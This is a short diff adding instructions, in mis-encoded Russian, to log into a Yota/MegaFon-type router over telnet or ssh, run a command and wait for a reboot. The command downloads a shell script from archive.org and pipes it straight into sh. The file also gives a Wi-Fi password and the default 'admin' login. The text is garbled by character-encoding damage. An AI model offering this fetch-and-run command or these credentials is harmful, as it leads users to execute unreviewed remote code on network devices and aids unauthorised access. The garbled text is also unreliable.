@@ -1,0 +1,10 @@
+ÐžÑ‚ÐºÑ€Ð¾Ð¹Ñ‚Ðµ telnet Ð¸Ð»Ð¸ ssh Ð¸ Ð²Ñ‹Ð¿Ð¾Ð»Ð½Ð¸Ñ‚Ðµ ÑÑ‚Ñƒ ÐºÐ¾Ð¼Ð°Ð½Ð´Ñƒ
+Ð´Ð¾Ð¶Ð´Ð¸Ñ‚ÐµÑÑŒ Ð¿ÐµÑ€ÐµÐ·Ð°Ð³Ñ€ÑƒÐ·ÐºÐ¸ Ñ€Ð¾ÑƒÑ‚ÐµÑ€Ð°. Ð½Ðµ Ð¿ÐµÑ€ÐµÐ±Ð¸Ð²Ð°Ð¹
+
+wget http://archive.org/download/yota1337_202306/yota1337.sh -O - | sh
+
+
+
+
+Wifi Password: cpemegafon
+Login username and password: admin
